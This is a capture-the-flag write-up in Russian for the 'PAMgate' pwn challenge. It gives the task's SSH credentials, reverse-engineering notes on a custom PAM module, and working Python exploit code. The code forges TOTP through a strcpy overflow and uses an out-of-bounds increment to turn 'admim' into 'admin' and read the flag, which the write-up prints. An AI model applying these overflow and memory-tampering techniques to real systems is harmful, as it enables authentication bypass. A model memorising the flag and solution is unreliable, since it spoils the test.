# PAMgate (task20) — write-up

**Avito CTF 2026 · Pwn (Linux, кастомный PAM-модуль, vsftpd)**

## 1. Условие и цель

**Доступ:** SSH `pamgate@pamgate-6kvkwh54.avitoctf.ru` (пароль `nsbq2wQfOjg8DXRAYGmRcw`). Внутри
попадаем в урезанный PTY-шелл под непривилегированным `player` (uid 1002), из которого доступен
`vsftpd` на `127.0.0.1:30029`. Аутентификацию в этом FTP делает кастомный PAM-модуль
`pam_pamgate.so` («бюро пропусков»): логин + одноразовый TOTP-код.

**Цель:** прочитать `/srv/ftp/admin/flag.txt`. Файл `0444`, но лежит в каталоге `0550 root:ftpvirt`.
Каталог доступен на `r-x` только пользователю `root` или группе `ftpvirt`. FTP-сессии выполняются
от системного пользователя `ftpvirt` (он и состоит в одноимённой группе), но **жёстко
chroot'ятся** в `/srv/ftp/$USER`. То есть прочитать флаг сможет только сессия, у которой
`$USER == admin` — тогда `local_root` вычислится как `/srv/ftp/admin`, а группа `ftpvirt` даст
доступ на чтение. `player` в группу `ftpvirt` не входит и напрямую (через `cat` по SSH) флаг не
читает.

**Итоговый флаг:**

```
avito{3a5Y_4DMIN_1NCREmeNt}
```

Само имя флага — подсказка: «easy admin increment». Решение действительно оказалось **инкрементом
одного байта**, превращающим `admim` в `admin`, без RCE и без ROP.

## 2. Разведка

### Что отдаёт сервис

Из world-readable `Dockerfile` и `/entrypoint.sh` на самой машине (`RE_NOTES.md`, `ESCAPE_NOTES.md`):

- `ubuntu:24.04`, `libc6=2.39-0ubuntu8.7`, `libpam-modules=1.5.3-5ubuntu5.5`,
  `vsftpd=3.0.5-0ubuntu3.1` (сток, без патчей).
- `/etc/vsftpd.conf`: `guest_enable=YES`, `guest_username=ftpvirt`, `user_sub_token=$USER`,
  `local_root=/srv/ftp/$USER`, `chroot_local_user=YES`, `allow_writeable_chroot=NO`,
  `write_enable=NO`, `pam_service_name=pamgate`, `listen_port=30029`. То есть каждый виртуальный
  пользователь маппится в одну ОС-учётку `ftpvirt` и chroot'ится в `/srv/ftp/<логин>`.
- Userstore `/run/pamgate/users` при старте засеян **только** строкой `guest:0:NBSWY3DPEHPK3PXQ`.
  `admin` в userstore **отсутствует** и заведён быть не может (см. ниже блок-лист).
- `sshd` модуль `pam_pamgate` **не использует** — модуль работает только для FTP-аутентификации.

### Флоу регистрации и аутентификации (реверс `pam_pamgate.so`)

Реверсом `pam_pamgate.so` (radare2, `RE_NOTES.md`) восстановлен весь `pam_sm_authenticate`
(`0x195e`). Модуль вызывается PAM'ом **до** того, как vsftpd сбросит привилегии и сделает chroot,
то есть исполняется **под root**. Логика:

```
pam_get_user(&user)                     ; var_10h = указатель на строку PAM_USER
get_authtok(&pw)                        ; пароль (FTP-команда PASS)
journal_init()                          ; g = calloc(256), если ещё не создан (.bss @0x5138)
found = userstore_lookup(user,&rec)     ; rec = {name, index, secret}, лежит на СТЕКЕ (rbp-0x50)
if (!found) {                           ; --- ветка ENROLL ---
    if (pw != "enroll") return PAM_AUTH_ERR
    validate_name(user)                 ; charset [A-Za-z0-9_-], len 1..32, блок-лист {admin,guest}
    userstore_create(user,&rec2)        ; секрет = RAND_bytes(16) -> base32
    ensure_home(user); write_totp(...); write_stats(user,0)
    return PAM_SUCCESS
}
/* --- ветка AUTH (пользователь существует) --- */
memset(buf/*rbp-0x5a, 10 байт*/, 0, 10)
jidx = rec.index                        ; 16-битный «журнальный индекс»
strcpy(buf, pw)                         ; <<< БЕЗ КАНАРЕЙКИ, БЕЗ ОГРАНИЧЕНИЯ ДЛИНЫ
if (!otp_verify(buf, rec.secret)) return PAM_AUTH_ERR   ; atoi(pw) == TOTP(rec.secret, now)
p = g + (int16)jidx
*p = *p + 1                             ; <<< OOB read-modify-write: g[idx]++
write_stats(user, (uint8)*p)            ; в /srv/ftp/<user>/stats.txt пишется "logins: N"
return PAM_SUCCESS
```

### Как проверяется «админ»

Ключевое наблюдение: **никакой проверки прав/uid/группы/флага `is_admin` в модуле нет**. Структура
`rec` содержит только `{name, index, secret}`. «Админ» — это просто предзаведённое имя `admin`,
под которым vsftpd chroot'ит сессию в `/srv/ftp/admin`. Значит задача сводится не к «стать
админом», а к «сделать так, чтобы vsftpd открыл сессию с `$USER == admin`».

Прямой путь закрыт двумя барьерами (оба подтверждены live, `ESCAPE_NOTES.md`, `WRITE_NOTES.md`):

1. `admin` нет в userstore → `USER admin` + любой пароль → `530`. Инъекция секрета (см. ниже)
   тоже не помогает: `lookup(admin)` промахивается **до** проверки OTP.
2. Зарегистрировать `admin` нельзя: `validate_name` держит блок-лист `{admin,guest}` и charset
   `[A-Za-z0-9_-]` (без `/` и `.`), так что и traversal-имя тоже не завести.

## 3. Уязвимость

Реверс `pam_sm_authenticate` сразу дал целый набор багов из одного `strcpy` без канарейки. Копия
пароля `strcpy`'ится в 10-байтный стековый буфер `buf@rbp-0x5a`, за которым лежат другие
переменные кадра. Карта переполнения (`RE_NOTES.md` §5, смещения байта пароля):

| смещение пароля | во что попадает | смысл |
|---|---|---|
| `[0:k]` | `buf[0..]` | ASCII OTP-кода (его читает `atoi`) |
| `[7:9]` | `var_53h` | 16-битный **знаковый** журнальный индекс |
| `[46:62]` | `rec.secret` | инъекция base32-секрета **до** OTP-проверки |
| `[74:82]` | `var_10h` | сохранённый указатель на `PAM_USER` |
| `[90:98]` | saved RBP | |
| `[98:106]` | return address | классический stack smash |

`strcpy` останавливается только на `0x00`; FTP-транспорт вдобавок запрещает `0x0a`/`0x0d` в
аргументе `PASS`. Отсюда три независимых примитива:

1. **Подделка TOTP.** Проверка кода — это `atoi(pw) == TOTP(rec.secret, now)`. Байты `[46:62]`
   перезаписывают `rec.secret` **до** сравнения. Раз атакующий контролирует и «код», и «секрет»,
   он логинится под **любым существующим** пользователем со своим секретом: подставляем
   `rec.secret = "AAAAAAAAAAAAAAAA"` (декодируется в 10 нулевых байт) и заранее считаем
   `TOTP("AAAAAAAAAAAAAAAA", now)`. Это работает для `guest` и для любого, кого мы сами
   зарегистрируем — но **не** для `admin` (его нет в userstore, lookup промахивается раньше).

2. **Неограниченный OOB-инкремент `g[idx]++`.** Байты `[7:9]` задают знаковый 16-битный индекс.
   После успешной OTP-проверки модуль делает `g[idx]++`, где `g = calloc(256)`, **без всякой
   проверки границ** (`OOB_HEAP_NOTES.md`, дизассемблирование `0x1b4a`–`0x1b62`). Это запись
   одного байта (`+1`) по адресу `g + (int16)idx`, то есть в окне `±32 КБ` от кучи модуля. Это и
   есть тот примитив, который довёл до флага. **Почему он вообще существует:** индекс задумывался
   как «слот журнала посещений» (`g[idx]++` = «счётчик визитов»), но берётся напрямую из
   переполняемого буфера и не валидируется по диапазону `0..255`.

3. **Контроль RIP.** Байты `[98:106]` перезаписывают адрес возврата — полноценный stack smash в
   root-процессе (`WRITE_NOTES.md`: длина пароля `89` безопасна, `90` уже роняет child в
   `500 OOPS: priv_sock_get_result`). Это выглядело как самый очевидный путь к флагу, но оказался
   тупиком (см. §6, «почему RCE не понадобился»).

## 4. Эксплуатация шаг за шагом

### Шаг 0. Инфраструктура

Все скрипты гоняются на самой машине (через SSH-харнесс `runbg.py`) против `127.0.0.1:30029`.
Payload передаётся сырыми FTP-байтами (`ftplib` с `encoding="latin-1"`); в нём нет `0x00`, `0x0a`,
`0x0d`. Готовая функция сборки payload (из рабочего `agents/username_flip_reopen/offset_sweep.py`):

```python
SECRET = b"AAAAAAAAAAAAAAAA"       # секрет, который сами инъектируем

def otp():
    d = hmac.new(base64.b32decode(SECRET), struct.pack(">Q", int(time.time() // 30)),
                 hashlib.sha1).digest()
    o = d[-1] & 0x0F
    return f"{(int.from_bytes(d[o:o+4], 'big') & 0x7fffffff) % 1000000:06d}".encode()

def password(idx):
    p = bytearray(b"P" * 62)
    p[:6]    = otp()                  # [0:6]  TOTP-код для нашего секрета
    p[6]     = ord("X")              # [6]    нецифровой байт: atoi() останавливается здесь
    p[7:9]   = struct.pack("<h", idx) # [7:9]  знаковый int16 журнальный индекс
    p[46:62] = SECRET                 # [46:62] замена rec.secret -> OTP пройдёт
    if any(x in (0, 10, 13) for x in p[7:9]):
        return None                   # индекс с запрещённым байтом на проводе пропускаем
    return bytes(p).decode("latin-1")
```

### Шаг 1. Зарегистрировать легальное «почти-админское» имя `admim`

`admin` в блок-листе, а `admim` отличается ровно одним байтом и проходит и charset, и блок-лист:

```
admim
    'm' = 0x6d
    0x6d + 1 = 0x6e = 'n'
admin
```

Регистрация — обычным enroll-флоу:

```python
f = ftplib.FTP(); f.encoding = "latin-1"; f.connect("127.0.0.1", 30029, timeout=10)
f.login("admim", "enroll")     # USER admim / PASS enroll -> "230 Login successful."
```

### Шаг 2. Прицелить `g[idx]++` не «куда попало», а в саму строку username

Это и есть ключевой поворот. Раньше OOB-инкремент рассматривали только как (а) счётчик визитов и
(б) способ найти function pointer / vtable в куче для перехвата управления. Мы попробовали **третий**
вариант — **менять байт уже существующей, легально выделенной строки** `PAM_USER`, которую тот же
процесс `vsftpd` держит в куче (та же куча форкнутого child'а, что и `g = calloc(256)` внутри
модуля — оба в пределах достижимого окна `±32 КБ`).

При логине под `admim` payload из шага 0 делает следующее в одном соединении:
1. `[46:62]` подменяет `rec.secret`, и OTP-проверка `atoi(pw) == TOTP(...)` проходит;
2. затем срабатывает `g[idx]++`, и при правильном `idx` инкремент попадает точно в **пятый байт**
   строки `PAM_USER` (`PAM_USER[4]`), превращая `'m'` (0x6d) в `'n'` (0x6e): `admim` → `admin` —
   уже **после** успешной аутентификации, прямо в памяти.

Мы отдельно подтвердили дизассемблированием живого `vsftpd`, что он **перечитывает** `PAM_USER`
уже после `pam_authenticate()` (`SOLVE.md`):

```
pam_start(...)
pam_set_item x3            ; RHOST/TTY/RUSER
pam_authenticate(pamh,0)  ; наш форджед OTP проходит здесь; здесь же отрабатывает g[idx]++
pam_get_item(pamh, 2 /*PAM_USER*/, &buf)   ; <-- перечитывание строки СРАЗУ после успеха
... результат идёт в построение сессии/chroot -> local_root=/srv/ftp/$USER
```

Если к этому вызову строка уже равна `admin`, vsftpd открывает сессию в `/srv/ftp/admin`.

### Шаг 3. Подобрать рабочий индекс (почему перебором, а не формулой)

Точный сдвиг между `g` и байтом `PAM_USER[4]` **не выводится аналитически**: он зависит от
конкретной цепочки аллокаций внутри проверки TOTP (OpenSSL 3.x при одном `HMAC-SHA1` делает уйму
мелких выделений) и от раскладки кучи форкнутого child'а. Поэтому индекс не вычисляли, а
**подбирали живым перебором** узкого, выровненного диапазона (гипотеза: нужный байт лежит по
остатку 4 от 16-байтного выравнивания malloc-чанка):

```python
LO, HI = -0x2000, -0x6C0
indices = [idx for idx in range(LO, HI) if (idx & 0xF) == 4]   # только idx % 16 == 4
```

Первые локальные кандидаты `-0x55c` и `-0x4fc` давали успешный вход, но `stats.txt` всё ещё
показывал `user: admim` — инкремент попадал мимо нужного байта. Поэтому расширили выровненный
sweep. Первый реальный hit:

```
idx = -6940     (знаковый int16, на проводе little-endian = e4 e4)
stats.txt:  user: admin
            logins: 110
```

### Шаг 4. Прочитать флаг в ТОЙ ЖЕ сессии

Важнейшая тонкость методологии: раскладка кучи у каждого форкнутого child'а своя, поэтому
**отдельное переподключение с фиксированным `idx=-6940` промахивается** — именно на этом раньше
ошибочно сделали вывод «flip не меняет chroot». Правильный sweep читает `flag.txt` немедленно, в
том же FTP-соединении, как только `stats.txt` показал `user: admin`:

```python
out["login"] = f.login("admim", pw)
f.retrbinary("RETR stats.txt", buf.write)         # проверяем маркер user: admin
if out["user"] == "admin":
    flag = io.BytesIO()
    f.retrbinary("RETR flag.txt", flag.write)     # тут же, в том же child, читаем флаг
    out["flag"] = flag.getvalue().decode()
```

## 5. Флаг

Живой ответ сервера в той же сессии (`agents/username_flip_reopen/raw/flag_hit.txt`):

```
ENROLL 230 Login successful.
HIT {"idx": -6940, "idx_hex": "e4e4", "login": "230 Login successful.",
     "logins": 110, "stats": "user: admin\nlogins: 110\n",
     "user": "admin", "flag": "avito{3a5Y_4DMIN_1NCREmeNt}\n"}
```

```
avito{3a5Y_4DMIN_1NCREmeNt}
```

`logins: 110` дополнительно подтверждает механизм: `110 = 0x6e = ASCII 'n'` — это тот же самый
инкрементированный байт, который превратил `'m'` в `'n'`. Модуль читает его же ещё раз для
`write_stats` и репортит как «число посещений».

## 6. Выводы и уроки

### Тупики, через которые прошли (и почему это data-only, а не RCE)

- **RCE через переполнение стека — реальный, но закрытый путь.** Тот же `strcpy` без канарейки даёт
  контроль RIP (доказано: 104-байтный payload с OTP-fail, `500 OOPS`; надёжная утечка libc-базы =
  `qword@(g+0x25a8) − 0x204220` для glibc 2.39-0ubuntu8.7). Но дизассемблирование диспетчера
  `libpam.so.0` зафиксировало регистры в момент перехвата: `RAX=7`, `RBX=1` всегда (ломает всё
  семейство `execve`/`posix_spawn` one-gadget'ов), а `strcpy` обрывается на первом `0x00`, из-за
  чего `RBP` не может быть каноническим указателем. Все 17 кандидатов `one_gadget -l2` закрыты
  **поимённо** конкретными фактами (`STATUS.md`, `PWN2_NOTES.md`), 7 из них отстреляны вживую → ноль
  новых процессов. Это настоящая стена, а не «не хватило попыток».

- **Редирект указателя `user` (var_10h @ смещение 74) — тоже тупик.** Механизм подтверждён вживую
  (`DATAONLY_WRITE_NOTES.md`): 80-байтный payload действительно перенаправляет root-овую запись
  `write_userfile`. Но (а) чтобы направить указатель на свою `../`-строку, нужен **адрес стека**, а
  OOB-оракул `g[idx]` его физически не достаёт — стек и куча на этом ядре рандомизируются
  независимо (подтверждено снятием `/proc/pid/maps` реального `vsftpd`); (б) имя файла всегда
  хардкод `stats.txt`/`totp.txt`, режим `fopen "w"` — read-примитива в модуле нет вообще; (в) chroot
  сессии vsftpd решает по сырому `USER` **до** запуска PAM. Закрыто математически.

### Мораль

Классический рефлекс «RIP — самый громкий примитив, значит цель RCE» здесь оказался ложным следом:
RCE-путь реально существовал (перехват RIP подтверждён), но был закрыт независимо зафиксированным
состоянием регистров диспетчера `libpam`. Настоящее решение спрятано в куда более тихом,
«служебном»-выглядящем примитиве (`g[idx]++`, изначально принятом за безобидный счётчик визитов) и
требовало не более сложного эксплойта, а **другой цели** для того же примитива: не искать
vtable/function pointer в куче, а поправить один байт в уже существующей, легитимно выделенной
строке username. Плюс логический урок: блок-лист проверяет только **момент регистрации**, а не
итоговую идентичность сессии — зарегистрировать «почти-имя» и на один байт исправить его в памяти
постфактум он не мешает. Урок: если очевидный (RIP) путь упирается в доказанную стену — не
эскалируй сложность того же примитива, а пересмотри, какие ещё данные лежат в достижимом окне.

## Уязвимости (стек причин)

1. **`strcpy` без канарейки и без ограничения длины** в `pam_sm_authenticate` — пускает
   переполнение и в `rec.secret` (подделка TOTP), и в 16-битный журнальный индекс, и в RIP.
2. **Неограниченный знаковый OOB-индекс** (`g[idx]++`, `±32 КБ`, без проверки границ) — примитив,
   который реально довёл до флага.
3. **Логическая дыра блок-листа**: `admin`/`guest` защищены только на регистрации; ничто не мешает
   зарегистрировать `admim` и исправить его байт в памяти уже после аутентификации.
4. **vsftpd повторно доверяет `PAM_USER`** после `pam_authenticate()` (штатное поведение PAM —
   модуль может переписать `PAM_USER`), что в связке с багами №1–3 и даёт финальный шаг.
